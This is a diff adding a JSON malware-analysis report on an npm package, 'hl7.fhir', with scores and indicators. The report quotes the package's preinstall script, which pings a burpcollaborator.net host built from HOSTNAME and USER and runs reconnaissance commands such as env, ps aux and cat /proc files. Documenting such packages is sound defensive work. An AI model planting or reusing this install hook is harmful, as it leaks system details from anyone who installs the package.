@@ -1,0 +1,40 @@
+{
+  "package_metadata": {
+    "name": "hl7.fhir",
+    "version": "0.0.0"
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_activity": [
+      {
+        "description": "Attempts to ping a suspicious domain with environment variable data.",
+        "details": "The preinstall script constructs a URL using HOSTNAME and USER variables, then pings it."
+      }
+    ],
+    "process_actions": [
+      {
+        "description": "Executes multiple commands including 'env', 'ps aux', and file reads via shell.",
+        "details": "Commands like 'cat /proc/version' and 'ps aux' are executed in the preinstall script."
+      }
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "package/package.json",
+        "code_snippet": "    \"preinstall\": \"export HOSTNAME && BCNET=\\\\\"linux-hl7.fhir-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\\\\\"; ping -c 1 $BCNET; for i in env \\\\\"ps aux\\\\\" \\\\\"cat /proc/version /proc/net/fib_trie /proc/net/if_inet6\\\\\" \\\\\"... || true\""
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.85,
+    "risk_score": 0.9,
+    "confidence": 0.95,
+    "indicators": [
+      "Suspicious domain used in network activity",
+      "Environment variable exfiltration attempt",
+      "Execution of system reconnaissance commands",
+      "Automated script execution on install"
+    ]
+  }
+}
